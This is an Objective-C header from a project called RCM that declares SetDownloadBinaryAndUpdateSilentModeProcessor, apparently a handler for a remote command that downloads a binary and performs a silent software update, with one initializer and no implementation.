//
//  SetDownloadBinaryAndUpdateSilentModeProcessor.h
//  RCM
//
//  Created by Makara Khloth on 7/5/15.
//
//

#import <Foundation/Foundation.h>

#import "RemoteCmdAsyncHTTPProcessor.h"
#import "SoftwareUpdateDelegate.h"

@interface SetDownloadBinaryAndUpdateSilentModeProcessor : RemoteCmdAsyncHTTPProcessor <SoftwareUpdateDelegate> {
    
}

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
    andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate;

@end
